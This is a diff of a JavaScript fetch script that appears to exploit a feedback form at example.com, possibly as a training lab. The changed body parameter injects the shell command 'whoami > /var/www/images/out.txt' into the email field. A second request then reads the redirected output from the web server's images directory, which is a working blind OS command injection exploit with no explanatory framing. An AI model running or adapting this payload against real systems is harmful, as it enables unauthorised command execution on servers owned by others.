@@ -86,11 +86,12 @@ async function submitFeedbackAndLogImage() {
         "sec-fetch-site": "same-origin"
       },
       "referrer": "https://example.com/feedback",
-      "body": "csrf=VNXRe5IObKOWXLvqUaX27zA7B0RhRj0Z&name=Huzefa&email=huzefa%40gmail.com&subject=Huzefa&message=Huzefa",
+      "body": "csrf=VNXRe5IObKOWXLvqUaX27zA7B0RhRj0Z&name=Huzefa&email=huzefa%40gmail.com; whoami > /var/www/images/out.txt;&subject=Huzefa&message=Huzefa",
       "method": "POST",
       "mode": "cors",
       "credentials": "include"
     });
+
     console.log(`First request status: ${response1.status}`);
 
     // 2. Fetch the subsequent text file
@@ -104,6 +105,7 @@ async function submitFeedbackAndLogImage() {
     const textData = await response2.text();
     console.log("Response text from out.txt:");
     console.log(textData);
+
   } catch (error) {
     console.error("An error occurred during the fetch operations:", error);
   }
